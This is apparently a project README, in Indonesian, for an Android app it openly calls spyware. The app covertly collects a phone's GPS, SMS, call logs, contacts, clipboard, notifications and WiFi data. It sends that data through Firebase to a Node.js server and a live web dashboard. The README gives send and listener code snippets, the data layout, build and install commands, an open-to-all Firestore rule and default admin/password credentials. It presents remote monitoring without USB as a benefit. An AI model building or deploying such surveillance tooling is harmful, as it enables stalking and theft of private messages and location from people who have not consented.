# Alur Data Firebase - Tanpa USB

Dokumentasi lengkap tentang bagaimana aplikasi Android spyware mengirim data ke Firebase dan menampilkannya di web dashboard **tanpa perlu colok USB**.

## 📊 Alur Data Lengkap

```
┌─────────────────┐
│  Android Device │
│  (Spyware App)  │
└────────┬────────┘
         │
         │ 1. Kumpulkan Data
         │    (GPS, SMS, Calls, Contacts, dll)
         │
         ▼
┌─────────────────┐
│  Firebase       │
│  Firestore      │ ◄─── Internet (WiFi/Mobile Data)
│  (Cloud)        │
└────────┬────────┘
         │
         │ 2. Server Listen Realtime
         │    (Firebase Admin SDK)
         │
         ▼
┌─────────────────┐
│  Node.js Server │
│  (SQLite DB)    │
└────────┬────────┘
         │
         │ 3. API Request
         │    (HTTP REST API)
         │
         ▼
┌─────────────────┐
│  Web Dashboard │
│  (Vue.js)       │
└─────────────────┘
```

## 🔄 Detail Alur Data

### 1. Android Device → Firebase Firestore

**Lokasi Kode:** `client/app/src/main/java/com/xploitspy/client/manager/FirebaseManager.java`

**Cara Kerja:**
- Aplikasi Android berjalan di background (Foreground Service)
- Mengumpulkan data secara berkala:
  - GPS: setiap 30 detik
  - SMS: setiap 60 detik
  - Calls: setiap 60 detik
  - Contacts: setiap 5 menit
  - Apps: setiap 10 menit
  - Clipboard: setiap 10 detik
  - WiFi: setiap 5 menit
  - Battery Status: setiap 30 detik

**Contoh Pengiriman Data:**
```java
// GPS Data
firebaseManager.sendGps(latitude, longitude, accuracy, altitude);

// SMS Data
firebaseManager.sendSms(phoneNumber, message, type);

// Device Status
firebaseManager.updateDeviceStatus(batteryLevel, isCharging);
```

**Struktur Data di Firestore:**
```
devices/
  └── {deviceId}/
      ├── (device info: name, version, status, battery)
      ├── gps_logs/
      │   └── {timestamp}/
      ├── sms_logs/
      │   └── {timestamp}/
      ├── call_logs/
      │   └── {timestamp}/
      ├── contacts/
      │   └── {phoneNumber}/
      ├── apps/
      │   └── {packageName}/
      ├── clipboard/
      │   └── {timestamp}/
      ├── notifications/
      │   └── {timestamp}/
      └── wifi/
          └── {timestamp}/
```

### 2. Firebase Firestore → Node.js Server

**Lokasi Kode:** `server/firebase.js`

**Cara Kerja:**
- Server menggunakan Firebase Admin SDK
- Mendengarkan perubahan realtime di Firestore menggunakan `onSnapshot()`
- Setiap kali ada data baru, server otomatis sync ke SQLite database
- Mengirim Socket.IO event untuk update realtime ke web dashboard

**Contoh Listener:**
```javascript
// Listen untuk GPS logs
db.collectionGroup('gps_logs').onSnapshot((snapshot) => {
  snapshot.docChanges().forEach((change) => {
    if (change.type === 'added') {
      // Sync ke SQLite
      sqliteDb.run('INSERT INTO gps_logs ...');
      // Emit ke web dashboard
      io.emit('gps_update', data);
    }
  });
});
```

**Data yang Disinkronkan:**
- Device registrations & status updates
- GPS logs
- SMS logs
- Call logs
- Contacts
- Installed apps
- Clipboard logs
- Notifications
- WiFi networks

### 3. Node.js Server → Web Dashboard

**Lokasi Kode:** 
- Server API: `server/index.js`
- Web Dashboard: `web/src/views/Dashboard.vue` & `web/src/views/Device.vue`

**Cara Kerja:**

**A. REST API (Initial Load):**
```javascript
// Dashboard memuat daftar devices
GET /api/devices

// Device detail memuat data spesifik
GET /api/devices/{deviceId}/gps
GET /api/devices/{deviceId}/sms
GET /api/devices/{deviceId}/calls
// ... dll
```

**B. Socket.IO (Realtime Updates):**
```javascript
// Web dashboard connect ke Socket.IO
const socket = io();

// Mendengarkan update realtime
socket.on('gps_update', (data) => {
  // Update UI secara realtime
  this.gpsLogs.unshift(data);
});

socket.on('sms_update', (data) => {
  this.smsLogs.unshift(data);
});
```

## ✅ Keuntungan Arsitektur Ini

### 1. **Tidak Perlu USB**
- Device mengirim data langsung ke Firebase via Internet
- Bisa dari WiFi atau Mobile Data
- Tidak perlu colok USB ke komputer

### 2. **Realtime Monitoring**
- Data muncul secara realtime di web dashboard
- Server listen perubahan di Firestore
- Web dashboard update via Socket.IO

### 3. **Cross-Network**
- Device bisa di WiFi A
- Server bisa di WiFi B
- Web dashboard bisa di mana saja
- Semua terhubung via Firebase Cloud

### 4. **Reliable**
- Firebase Firestore reliable dan scalable
- Data tersimpan di cloud
- Tidak hilang meski device offline sementara

## 🔧 Konfigurasi yang Diperlukan

### 1. Firebase Setup

**Android Client:**
- File: `client/app/google-services.json`
- Download dari Firebase Console → Project Settings → Your Apps

**Server:**
- File: `server/firebase-service-account.json`
- Download dari Firebase Console → Project Settings → Service Accounts

### 2. Firestore Database Rules

```javascript
rules_version = '2';
service cloud.firestore {
  match /databases/{database}/documents {
    match /devices/{deviceId}/{document=**} {
      // Allow read/write untuk semua (untuk testing)
      // PRODUCTION: Gunakan authentication!
      allow read, write: if true;
    }
  }
}
```

### 3. Network Requirements

**Android Device:**
- Koneksi Internet (WiFi atau Mobile Data)
- Permission: `INTERNET`

**Server:**
- Koneksi Internet
- Port 3000 (atau 80) terbuka untuk web dashboard

**Web Dashboard:**
- Akses ke server via browser
- Bisa localhost atau IP public

## 📱 Testing Alur Data

### 1. Install APK di Device
```bash
cd client
./gradlew assembleDebug
adb install -r app/build/outputs/apk/debug/app-debug.apk
```

### 2. Start Server
```bash
cd server
npm run pm2:start
```

### 3. Buka Web Dashboard
```
http://localhost:3000
# atau
http://YOUR_SERVER_IP:3000
```

### 4. Verifikasi Data Flow

**Cek Firebase Console:**
1. Buka: https://console.firebase.google.com
2. Pilih project: `xploitspy-e4297`
3. Firestore Database → Data
4. Harus muncul collection `devices` dengan data

**Cek Server Logs:**
```bash
cd server
npm run pm2:logs
```
Harus muncul:
```
✅ Firebase initialized successfully
✅ Firestore listeners active
Device synced from Firestore: {deviceId} (online)
```

**Cek Web Dashboard:**
- Login: `admin` / `password`
- Device harus muncul di "Connected Devices"
- Data harus muncul realtime di setiap tab

## 🚨 Troubleshooting

### Device tidak muncul di dashboard
1. Cek Firebase Console → Firestore → Data
2. Pastikan device sudah register di collection `devices`
3. Cek server logs untuk error sync

### Data tidak realtime
1. Pastikan Socket.IO connection di web dashboard
2. Cek browser console untuk error
3. Pastikan server emit event saat sync data

### Firebase connection error
1. Cek `google-services.json` di Android client
2. Cek `firebase-service-account.json` di server
3. Pastikan Firestore Database sudah dibuat di Firebase Console

## 📝 Kesimpulan

Sistem sudah terintegrasi dengan benar untuk monitoring **tanpa USB**:

✅ Android → Firebase (via Internet)  
✅ Firebase → Server (realtime sync)  
✅ Server → Web Dashboard (API + Socket.IO)  

**Tidak perlu colok USB sama sekali!** Device hanya perlu koneksi Internet (WiFi atau Mobile Data).

